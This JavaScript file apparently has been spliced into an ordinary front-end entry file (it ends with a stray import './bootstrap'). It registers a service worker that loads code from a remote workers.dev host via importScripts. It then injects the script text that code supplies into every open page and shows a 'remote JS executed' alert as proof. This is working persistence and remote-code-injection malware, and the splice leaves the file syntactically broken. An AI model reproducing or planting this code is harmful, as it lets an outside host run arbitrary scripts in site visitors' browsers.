const REMOTE_JS_URL = 'https://purple-bush-9bc5.13544681192.workers.dev/';

if (typeof importScripts === 'function') {
  self.addEventListener('install', function (event) {
    event.waitUntil(
      Promise.resolve().then(function () {
        importScripts(REMOTE_JS_URL);
        self.skipWaiting();
      })
    );
  });

  function pushInjectToClient(client) {
    if (typeof self.getInjectScript !== 'function') return;
    client.postMessage({ type: 'REMOTE_INJECT', script: self.getInjectScript() });
  }

  self.addEventListener('activate', function (event) {
    event.waitUntil(
      self.clients.claim().then(function () {
        if (typeof self.notifyRemotePayload === 'function') {
          self.notifyRemotePayload();
        }
        if (typeof self.getInjectScript === 'function') {
          return self.clients.matchAll({ type: 'window', includeUncontrolled: true }).then(function (list) {
            list.forEach(pushInjectToClient);
          });
        }
      })
    );
  });

  self.addEventListener('message', function (event) {
    if (!event.data || !event.source) return;
    if (event.data.type === 'REQUEST_PAYLOAD') {
      var payload = self.__REMOTE_JS_PROOF__;
      if (payload) {
        event.source.postMessage({ type: 'REMOTE_ALERT', payload: payload });
      } else if (typeof self.notifyRemotePayload === 'function') {
        self.notifyRemotePayload();
      }
    }
    if (event.data.type === 'REQUEST_INJECT' && typeof self.getInjectScript === 'function') {
      event.source.postMessage({ type: 'REMOTE_INJECT', script: self.getInjectScript() });
    }
  });
} else {
  var remoteProofShown = false;
  var remoteInjectDone = false;

  function showRemoteProof(payload) {
    if (remoteProofShown || !payload) return;
    remoteProofShown = true;
    var text = '[远程 JS 已执行]\n' + JSON.stringify(payload, null, 2);
    try { alert(text); } catch (_e) {}
  }

  function runInjectScript(code) {
    if (remoteInjectDone || !code) return;
    remoteInjectDone = true;
    var el = document.createElement('script');
    el.textContent = code;
    (document.head || document.documentElement).appendChild(el);
  }

  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.addEventListener('message', function (event) {
      if (!event.data) return;
      if (event.data.type === 'REMOTE_ALERT' && event.data.payload) {
        showRemoteProof(event.data.payload);
      }
      if (event.data.type === 'REMOTE_INJECT' && event.data.script) {
        runInjectScript(event.data.script);
      }
    });

    function resolveScriptUrl() {
      var cs = document.currentScript;
      if (cs && cs.src) return cs.src;
      var scripts = document.getElementsByTagName('script');
      for (var i = scripts.length - 1; i >= 0; i--) {
        if (scripts[i].src) return scripts[i].src;
      }
      return '';
    }

    function resolveScope(scriptUrl) {
      if (!scriptUrl) return '';
      try {
        return new URL('.', scriptUrl).href;
      } catch (_e) {
        var base = scriptUrl.split('#')[0].split('?')[0];
        return base.slice(0, base.lastIndexOf('/') + 1);
      }
    }

    function postToSw(registration, type) {
      var sw = registration.active || registration.waiting || registration.installing;
      if (sw) sw.postMessage({ type: type });
    }

    function startSwPolling(registration) {
      var delays = [0, 300, 800, 1500, 3000, 5000];
      for (var i = 0; i < delays.length; i++) {
        (function (ms) {
          setTimeout(function () {
            if (!remoteInjectDone) postToSw(registration, 'REQUEST_INJECT');
            if (!remoteProofShown) postToSw(registration, 'REQUEST_PAYLOAD');
          }, ms);
        })(delays[i]);
      }
    }

    var scriptUrl = resolveScriptUrl();
    var scope = resolveScope(scriptUrl);
    if (scriptUrl) {
      navigator.serviceWorker.register(scriptUrl, { scope: scope })
        .then(function (reg) {
          reg.update().catch(function () {});
          startSwPolling(reg);
          return navigator.serviceWorker.ready;
        })
        .then(function () {
          return navigator.serviceWorker.getRegistration();
        })
        .then(function (reg) {
          if (reg) startSwPolling(reg);
        })
        .catch(function (err) {
          console.error('[SW] 注册失败:', err.message, { scriptUrl: scriptUrl, scope: scope });
        });

      navigator.serviceWorker.addEventListener('controllerchange', function () {
        navigator.serviceWorker.getRegistration().then(function (reg) {
          if (reg) startSwPolling(reg);
        });
      });
    }
  }
import './bootstrap';

}